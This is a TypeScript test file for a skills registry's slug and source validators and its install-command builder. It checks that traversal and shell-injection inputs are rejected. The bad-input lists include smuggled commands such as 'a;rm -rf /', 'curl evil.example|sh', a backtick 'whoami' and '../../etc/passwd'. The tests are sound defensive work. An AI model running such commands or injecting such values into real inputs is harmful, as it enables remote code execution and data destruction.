import assert from "node:assert/strict";
import { test } from "node:test";

import { installCommand } from "../src/lib/format.ts";
import { isValidSlug, isValidSource } from "../src/lib/identifiers.ts";

test("isValidSlug accepts registry slugs", () => {
  assert.ok(isValidSlug("dfl-code-style"));
  assert.ok(isValidSlug("app-security"));
});

test("isValidSlug rejects anything that could escape a filename or a command", () => {
  for (const bad of ["../../etc/passwd", "a/b", "-flag", "a b", "a;rm -rf /", "", "a\nb"]) {
    assert.equal(isValidSlug(bad), false, bad);
  }
});

test("isValidSource requires owner/repo and refuses traversal", () => {
  assert.ok(isValidSource("devfellowship/internal-skills"));
  for (const bad of ["devfellowship", "../evil/repo", "a/../b", "a/b/c", "a b/c", "a/b; curl evil|sh"]) {
    assert.equal(isValidSource(bad), false, bad);
  }
});

test("installCommand refuses to build a command a shell would reinterpret", () => {
  assert.equal(installCommand("devfellowship/skills", "test-driven-development"), "npx skills add devfellowship/skills/test-driven-development");
  assert.equal(installCommand("devfellowship/skills", "a; curl evil.example|sh"), null);
  assert.equal(installCommand("a/b`whoami`", "ok"), null);
  assert.equal(installCommand("../evil/repo", "ok"), null);
});
